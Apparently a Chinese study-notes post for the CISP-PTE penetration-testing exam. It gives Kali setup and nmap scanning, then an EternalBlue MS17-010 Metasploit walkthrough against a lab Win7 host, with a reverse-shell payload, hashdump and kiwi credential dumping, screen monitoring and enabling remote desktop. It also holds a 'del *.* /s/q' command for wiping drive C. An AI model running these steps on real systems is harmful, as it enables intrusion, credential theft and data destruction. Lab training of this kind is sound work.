---
title: CISP-PTE
date: 2025-08-17 11:12:01
categories:
tags:
---


## 环境准备

### Win7

```bash
# 删除C盘的全部文件
del *.* /s/q
```

### Kali
```bash
# 设置中文
sudo dpkg-reconfigure locales

# 修改root密码
sudo -i
password root

## root用户视图下，更换kali源仓库为国内
cd /etc/apt
cp sources.list sources.list.bak
# 阿里源
deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
# apt更新
apt update # 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5

## 实用工具
# 检测主机是否存在
fping -asg 192.168.112.0/24 -C 1

## nmap  网络探测和安全审核
# nmap 192.168.112.128
135/tcp   open  msrpc # RPC远程调用
139/tcp   open  netbios-ssn # 文件共享
445/tcp   open  microsoft-ds # 永恒之蓝
3389/tcp  open  ms-wbt-server # 远程桌面端口
5357/tcp  open  wsdapi # 非常高危的端口
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
# nmap -sV 192.168.112.128

# nmap -p 1-65535 192.168.112.128

# nmap -p- 192.168.112.128
```

### 永恒之蓝 MS17-010

```bash
sudo nmap -sS -p 445 192.168.112.0/24 > p_445

cat p_445 | grep -E "Nmap|open"

# 
msfconsole
  search ms17_010
  use auxiliary/scanner/smb/smb_ms17_010
  use exploit/windows/smb/ms17_010_eternalblue\
    set rhost 192.168.112.128 # 设置靶机
    set lhost 192.168.112.130 # 设置本机IP
    set payload windows/x64/meterpreter/reverse_tcp
    run # 开始攻击

## 攻击成功后的操作
screenshot # 截图
screenshare # 实时监控屏幕
# 查看密码
hashdump
load kiwi
ps -S "csrss"
migrate 344
creds_all
shell # 登陆到win7
chcp 65001 # 消除乱码
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 远程
netstat -an # 查看端口
sudo rdesktop 192.168.112.128 # 发起远程
```

### SQL注入--CVE-2022-32991漏洞复现

```bash

```